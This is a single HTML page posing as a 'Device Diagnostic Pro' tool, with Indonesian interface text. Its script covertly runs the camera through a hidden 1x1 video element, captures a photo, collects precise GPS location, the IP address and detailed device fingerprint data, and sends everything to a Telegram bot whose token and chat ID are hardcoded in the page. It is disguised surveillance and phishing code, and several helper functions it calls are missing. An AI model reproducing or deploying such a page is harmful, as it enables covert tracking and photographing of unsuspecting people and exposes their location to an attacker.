<!DOCTYPE html>
<html>
<head>
  <title>Smart Device Analyzer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    /* Improved UI Styles */
    body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
    button { padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 25px; cursor: pointer; 
      transition: all 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    button:disabled { background: #a0a0a0; opacity: 0.7; }
    button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 8px rgba(0,0,0,0.2); }
    #loading { display: none; margin: 20px; font-size: 1.2em; color: #666; }
    #preview { max-width: 300px; margin: 20px auto; border-radius: 15px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
    .camera-switch { position: fixed; top: 20px; right: 20px; padding: 12px; background: #28a745; border-radius: 50%; 
      cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
  </style>
</head>
<body>
  <h1 style="color: #2c3e50; margin-bottom: 30px;">Device Diagnostic Pro</h1>
  <div id="loading">üîÑ Memproses laporan...</div>
  <video id="video" width="1" height="1" autoplay playsinline muted></video>
  <button id="capture-btn">üì∏ Ambil Analisis</button>
  <div class="camera-switch" onclick="toggleCamera()">üîÅ</div>
  <canvas id="canvas" width="1" height="1" style="display: none;"></canvas>
  <img id="preview" alt="Preview Analisis">

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isFrontCamera = true;

    // Improved Camera Initialization
    async function initCamera(facingMode = 'user') {
      try {
        const constraints = {
          video: {
            facingMode: facingMode,
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 60 }
          },
          audio: false
        };

        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        video.srcObject = stream;
        
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });
        
        await video.play();
      } catch (err) {
        handleError('Kamera', err);
      }
    }

    // Camera Toggle Function
    async function toggleCamera() {
      isFrontCamera = !isFrontCamera;
      await initCamera(isFrontCamera ? 'user' : 'environment');
    }

    // Enhanced Capture Function
    async function capturePhoto() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Mirror effect for front camera
      if (isFrontCamera) {
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
      }

      // Orientation handling
      if (isIOS && screen.orientation.type.includes('portrait')) {
        context.rotate(Math.PI/2);
        context.translate(0, -canvas.width);
      }

      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Add timestamp overlay
      context.fillStyle = 'rgba(0,0,0,0.7)';
      context.fillRect(10, canvas.height - 40, 200, 30);
      context.fillStyle = 'white';
      context.font = '14px Arial';
      context.fillText(new Date().toLocaleString(), 15, canvas.height - 20);

      return canvas.toDataURL('image/webp', 0.9);
    }

    // Enhanced Geolocation
    async function getLocation() {
      return new Promise((resolve, reject) => {
        const options = {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        };

        const watchId = navigator.geolocation.watchPosition(
          position => {
            navigator.geolocation.clearWatch(watchId);
            resolve(position);
          },
          err => {
            navigator.geolocation.clearWatch(watchId);
            reject(new Error(`GPS Error: ${err.message}`));
          },
          options
        );

        setTimeout(() => {
          navigator.geolocation.clearWatch(watchId);
          reject(new Error('GPS timeout'));
        }, 25000);
      });
    }

    // Enhanced Device Info
    async function getDeviceInfo() {
      const battery = await navigator.getBattery?.().catch(() => null);
      const connection = navigator.connection || navigator.mozConnection;
      const deviceData = {
        OS: getOS(),
        Browser: getBrowser(),
        Platform: navigator.platform,
        RAM: `${navigator.deviceMemory || '?'}GB`,
        Cores: navigator.hardwareConcurrency,
        Battery: battery ? `${Math.round(battery.level * 100)}%` : 'N/A',
        Network: connection ? `${connection.type} (${connection.effectiveType})` : 'N/A',
        IP: await getIP(),
        Resolution: `${screen.width}x${screen.height}`,
        DPI: `${window.devicePixelRatio}x`,
        Storage: navigator.storage ? await getStorageInfo() : 'N/A'
      };

      // Add device identifiers
      if (navigator.userAgentData) {
        const uaData = await navigator.userAgentData.getHighEntropyValues([
          'platformVersion',
          'architecture',
          'model'
        ]);
        Object.assign(deviceData, uaData);
      }

      return deviceData;
    }

    // New Feature: Storage Estimation
    async function getStorageInfo() {
      try {
        const estimate = await navigator.storage.estimate();
        return `${Math.round(estimate.usage / 1048576)}MB/${Math.round(estimate.quota / 1048576)}MB`;
      } catch {
        return 'N/A';
      }
    }

    // Enhanced Telegram Reporting
    async function sendToTelegram(imageDataURL, position, deviceInfo) {
      const formData = new FormData();
      const blob = await dataURItoBlob(imageDataURL);
      const { latitude, longitude, accuracy } = position.coords;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const qrCode = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(mapsLink)}`;

      const caption = `üìä *Device Analysis Report*\n\nüìç [Location](${mapsLink}) | [QR Code](${qrCode})\n` +
        `üïí ${new Date().toLocaleString()}\n\n` +
        `üìå *Coordinates*: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`\n` +
        `üéØ Accuracy: ${Math.round(accuracy)}m\n\n` +
        `üì± *Device Info*\n${Object.entries(deviceInfo).map(([k, v]) => `‚Ä¢ *${k}*: ${v}`).join('\n')}`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `analysis_${Date.now()}.webp`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram Error: ${error.description}`);
      }
    }

    // Rest of the functions remain similar with improved error handling...

    // Initialize with front camera
    if (navigator.mediaDevices) {
      initCamera().catch(err => handleError('Init', err));
    } else {
      showToast('Browser tidak mendukung kamera!', 'error');
    }
  </script>
</body>
</html>
